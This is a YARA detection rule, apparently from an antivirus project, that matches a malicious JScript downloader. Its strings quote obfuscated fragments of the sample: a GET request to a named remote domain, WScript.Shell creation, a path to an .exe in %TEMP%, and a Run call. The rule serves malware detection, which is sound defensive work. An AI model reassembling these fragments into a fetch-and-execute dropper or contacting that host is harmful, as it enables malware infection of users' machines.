rule sig_20160401_b1479b56a927b06eb355461a9b0a5e26 {
  meta:
    description = "datamaliciousorder - file 20160401_b1479b56a927b06eb355461a9b0a5e26.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2397a8ef8dad895878f98a752fc5ad31c37a5eaf9aec47fcbcb819299ffe2417"

  strings:
    $s1  = "GekOjo[ZsjVwq](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/p2iskd\", false);" fullword ascii
    $s2  = "var OkeGy = function YtCd() {return WScript[DwrTn](\"WScript\"+\".Shell\");}(), JlgDo = 11;" fullword ascii
    $s3  = "function RoHks(FffZw, OuBdj){WkdPht = WkdPht * 1; return FffZw - OuBdj;};" fullword ascii
    $s4  = "if (GekOjo[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function RzlTz(){return TlkFb + \"\";};" fullword ascii
    $s6  = "function SdkNn() {return OkeGy[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"TcJRLxVVB7cN.ex\" + \"e\";};" fullword ascii
    $s7  = "function UedRu() {return ((SzQu == true) && (SzQu == KkCue)) ? 1 : WkdPht;};" fullword ascii
    $s8  = "var QgGn = false;" fullword ascii
    $s9  = "function HtGrf(){return 23;};" fullword ascii
    $s10 = "var SzQu = false;" fullword ascii
    $s11 = "var KkCue = false;" fullword ascii
    $s12 = "var VvkWzx = new this[\"Date\"]();" fullword ascii
    $s13 = "SzQu = true; " fullword ascii
    $s14 = "function NlEn(){return DwrTn;};" fullword ascii
    $s15 = "return RoHks(VsZp, HySfz);" fullword ascii
    $s16 = "function LcZo(PikPu) {var MaDe = (1, 2, 3, 4, 5, PikPu); return MaDe;};" fullword ascii
    $s17 = "function IcInw(EkAe){OkeGy[\"R\"+\"un\"](EkAe, WkdPht, WkdPht);};" fullword ascii
    $s18 = "KkCue = true; " fullword ascii
    $s19 = "}while (HbfZkp);" fullword ascii
    $s20 = "function XskSs()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}